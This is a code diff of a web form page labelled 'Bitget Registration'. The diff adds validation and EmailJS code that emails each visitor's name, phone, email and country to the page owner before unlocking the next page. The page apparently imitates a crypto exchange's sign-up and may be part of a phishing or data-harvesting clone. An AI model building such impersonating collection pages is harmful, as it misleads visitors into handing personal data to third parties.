@@ -4,7 +4,9 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Bitget Registration</title>
-  <link rel="stylesheet" href="Style.css">
+  <link rel="stylesheet" href="style.css">
+  <!-- EMAILJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
   <div class="card">
@@ -18,25 +20,147 @@
       <h2>Please fill in the form below<br>to proceed</h2>
     </div>
 
-    <form>
+    <form id="secondPageForm">
       <label for="name">Name:</label>
-      <input type="text" id="name" placeholder="Name" required>
+      <span class ="error" id="nameError"></span>
+      <input type="text" id="name" name="name" placeholder="Name" >
 
       <label for="phone">Phone:</label>
-      <input type="tel" id="phone" placeholder="Phone" required>
+      <span class="error" id ="phoneError"></span>
+      <input type="tel" id="phone" name="phone" placeholder="Phone" >
 
       <label for="email">Email:</label>
-      <input type="email" id="email" placeholder="Email" required>
+      <span class ="error" id ="emailError"></span>
+      <input type="email" id="email" name="email" placeholder="Email" >
 
       <label for="country">Country:</label>
-      <input type="text" id="country" placeholder="Country" required>
+      <span class ="error" id ="countryError"></span>
+      <input type="text" id="country" name="country" placeholder="country" >
 
       <button type="submit" class="btn-submit">Submit</button>
 
       <div class="btn-row">
-        <button type="button" class="btn-next" onclick="window.location.href='third.html'">Next</button>
+        <button type="button" class="btn-next" id="nextBtn" disabled>Next</button>
       </div>
     </form>
   </div>
+  
+  <script>
+    // YOUR PUBLIC KEY
+    (function(){
+      emailjs.init("trKd_qkfAMWqGxcTW"); 
+    })();
+
+    document.addEventListener('DOMContentLoaded', function() {
+      const form = document.getElementById('secondPageForm');
+      const btn = document.getElementById('nextBtn');
+      const submitBtn = form.querySelector('.btn-submit');
+      const inputs = Array.from(form.querySelectorAll('input'));
+      
+      let canProceed = false;
+
+      btn.disabled = true;
+
+      function clearErrors() {
+        document.querySelectorAll('.error').forEach(span => {
+          span.textContent = '';
+          span.classList.remove('show');
+        });
+      }
+
+      function showError(span, message) {
+        span.textContent = message;
+        setTimeout(() => {
+          span.classList.add('show');
+        }, 10);
+      }
+
+      function getFirstError() {
+        for (let input of inputs) {
+          const errorSpan = document.getElementById(input.id + 'Error');
+          const placeholder = input.placeholder;
+          const value = input.value.trim();
+
+          if (value === '') {
+            return { message: `pls enter your ${placeholder} `, span: errorSpan };
+          }
+          
+          if (input.id === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
+            return { message: `pls enter a valid ${placeholder} `, span: errorSpan };
+          }
+
+          if (input.id === 'phone' && !/^[0-9+\-\s()]{8,15}$/.test(value)) {
+            return { message: `pls enter a valid ${placeholder} `, span: errorSpan };
+          }
+        }
+        return null;
+      }
+
+      inputs.forEach(input => {
+        input.addEventListener('input', () => {
+          canProceed = false;
+          btn.disabled = true;
+          btn.textContent = "Next";
+          submitBtn.disabled = false;
+          submitBtn.textContent = "Submit";
+          clearErrors();
+        });
+      });
+
+      // WHEN SUBMIT IS CLICKED -> VALIDATE -> SEND EMAIL -> UNLOCK NEXT
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const allEmpty = inputs.every(input => input.value.trim() === '');
+        if (allEmpty) {
+          alert("pls fill out the required form to proceed");
+          return;
+        }
+
+        clearErrors();
+        const firstError = getFirstError();
+
+        if (firstError) {
+          showError(firstError.span, firstError.message);
+          canProceed = false;
+          btn.disabled = true;
+        } else {
+          // Validation passed. Send to your email now
+          submitBtn.disabled = true;
+          submitBtn.textContent = "Sending...";
+
+          const templateParams = {
+            name: document.getElementById('name').value,
+            phone: document.getElementById('phone').value,
+            email: document.getElementById('email').value,
+            country: document.getElementById('country').value
+          };
+
+          emailjs.send("service_yx1rj2j", "template_qz0audi", templateParams)
+          .then(function(response) {
+             console.log('SUCCESS!', response.status);
+             alert("Submitted! Check your email.");
+             canProceed = true;
+             btn.disabled = false;
+             btn.textContent = "Next →";
+             submitBtn.textContent = "Submitted ✓";
+          }, function(error) {
+             console.log('FAILED...', error);
+             alert("Failed to send. Please check your internet and try again.");
+             submitBtn.disabled = false;
+             submitBtn.textContent = "Submit";
+          });
+        }
+      });
+
+      // GO TO NEXT PAGE ONLY AFTER EMAIL SENT
+      btn.addEventListener('click', function() {
+        if (canProceed) {
+          window.location.href = "Page3.Html";
+        }
+      });
+
+    });
+  </script>
 </body>
 </html>
